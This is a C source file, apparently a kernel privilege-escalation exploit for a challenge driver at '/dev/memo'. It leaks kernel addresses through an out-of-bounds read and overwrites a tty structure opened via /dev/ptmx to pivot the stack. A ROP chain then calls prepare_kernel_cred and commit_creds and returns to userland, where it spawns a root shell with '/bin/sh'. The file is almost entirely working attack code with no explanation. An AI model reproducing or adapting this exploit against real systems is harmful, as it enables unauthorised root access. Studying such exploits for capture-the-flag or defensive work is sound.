#define _GNU_SOURCE
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <linux/userfaultfd.h>
#include <assert.h>

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
        exit(1337);
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

long user_cs;
long user_ss;
long user_sp;
long user_rflags;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

int memo = 0, tty_fd = 0;
static int page_size = 0x1000;
unsigned long global_sharer = 0;
char buf[0x500];
unsigned long leak[0x100] = {0};
long condition = 0;
unsigned long pivot_point = 0;

int main()
{
	save_state();
	system("cat /symbols | grep \"\\[memo\"");

	memo = open("/dev/memo", O_RDWR);
	if (!memo)	exit(puts("ERROR in open()"));

	memset(buf, 0x41, 0x400);
	lseek(memo, 0x400-0x10, SEEK_SET);
	write(memo, buf, 0x10);
	memset(buf, 0x00, 0x400);
	lseek(memo, 0x400-0x10, SEEK_SET);
	read(memo, buf, 0x10);
	puts(buf);
	
	tty_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
	if (!tty_fd)	exit(puts("ERROR in open()"));
	
	printf("lseek() returns: 0x%lx\n", lseek(memo, 0x400-0x10, SEEK_SET));
	memset(buf, 0x41, 0x400);
	printf("read() returns: 0x%lx\n", read(memo, leak, 0x400));

	unsigned long kernel_base = leak[5] - 0xe65900;
	unsigned long memo_base = leak[9] - 0x438;
	pivot_point = kernel_base + 0x94d4e3;	// 0xffffffff8194d4e3 : push r12 ; add dword ptr [rbp + 0x41], ebx ; pop rsp ; pop r13 ; ret
	printf("kernel_base: 0x%lx\n", kernel_base);
	printf("memo_base: 0x%lx\n", memo_base);

	unsigned long pop_rdi = kernel_base + 0x01268;
	unsigned long prepare_kernel_cred = kernel_base + 0x07bb50;
	unsigned long commit_creds = kernel_base + 0x7b8b0;
	unsigned long pop_rcx = kernel_base + 0x4c852;
	unsigned long mov_rdi_rax = kernel_base + 0x019dcb;
	unsigned long swapgs_pop1 = kernel_base + 0xa00e1a;
	unsigned long iretq = kernel_base + 0x020b12;
	
	printf("breakpoint: 0x%lx\n", swapgs_pop1);

	printf("lseek() returns: 0x%lx\n", lseek(memo, 0x400-0x10, SEEK_SET));
	memset(buf, 0x41, 0x400);
	leak[2+3] = memo_base;
	printf("write() returns: 0x%lx\n", write(memo, leak, 0x40));

	lseek(memo, 0, SEEK_SET);
	memset(leak, 0, 0x400);
	int i=0;
	for (i=0; i<14; i++)	leak[i] = pivot_point;
	i++; i++;
	leak[i++] = 0x4141414141414141;
	leak[i++] = pop_rdi;
	leak[i++] = 0;
	leak[i++] = prepare_kernel_cred;
	leak[i++] = pop_rcx;
	leak[i++] = 0;
	leak[i++] = mov_rdi_rax;
	leak[i++] = commit_creds;
	leak[i++] = swapgs_pop1;
	leak[i++] = 0x3131313131313131;
	leak[i++] = iretq;
	leak[i++] = get_shell;
    leak[i++] = user_cs;
    leak[i++] = user_rflags;
    leak[i++] = user_sp;
    leak[i++] = user_ss;
	
	signal(SIGSEGV, get_shell);

	printf("write() returns: 0x%lx\n", write(memo, leak, 0x3f0));
	
	// read(0, buf, 1);

	ioctl(tty_fd, 0, memo_base + 0x80);
	
	return 0;
}